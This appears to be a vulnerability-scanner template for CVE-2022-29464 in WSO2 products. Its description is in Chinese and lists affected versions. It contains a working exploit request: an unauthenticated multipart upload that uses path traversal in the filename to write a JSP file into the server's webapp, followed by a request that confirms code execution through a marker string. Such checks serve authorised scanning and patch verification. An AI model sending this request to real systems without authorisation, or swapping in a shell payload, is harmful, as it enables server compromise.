id: CVE-2022-29464

info:
  name: WSO2 Management - Arbitrary File Upload & Remote Code Execution
  author: luci,dhiyaneshDk
  severity: critical
  description: |
    CVE-2022-29464 是 Orange Tsai发现的 WSO2 上的严重漏洞。该漏洞是一种未经身份验证的无限制任意文件上传，允许未经身份验证的攻击者通过上传恶意 JSP 文件在 WSO2 服务器上获得 RCE。
    WSO2 API Manager 2.2.0 and above
    WSO2 Identity Server 5.2.0 and above
    WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, 5.6.0
    WSO2 Identity Server as Key Manager 5.3.0 and above
    WSO2 Enterprise Integrator 6.2.0 and above
  reference:
    - http://wiki.peiqi.tech/wiki/webapp/WSO2/WSO2%20fileupload%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20CVE-2022-29464.html

set:
  randstr: randomLowercase(27)
  rboundary: randomLowercase(8)
rules:
  r0:
    request:
      method: POST
      path: /fileupload/toolsAny
      headers:
        Content-Type: multipart/form-data; boundary=WebKitFormBoundary{{rboundary}}
      body: "\
          --WebKitFormBoundary{{rboundary}}\r\n\
          Content-Disposition: form-data; name=\"../../../../repository/deployment/server/webapps/authenticationendpoint/{{randstr}}.jsp\";filename=\"test.jsp\"\r\n\
          Content-Type:application/octet-stream\r\n\
          \r\n\
          <% out.print(\"WSO2-RCE-CVE-2022-29464\"); %>\r\n\
          --WebKitFormBoundary{{rboundary}}--\r\n\
          "
    expression: response.status == 200
  r1:
    request:
      method: GET
      path: /authenticationendpoint/{{randstr}}.jsp
    expression: response.status == 200 && response.body.bcontains(b'WSO2-RCE-CVE-2022-29464')
expression: r0() && r1()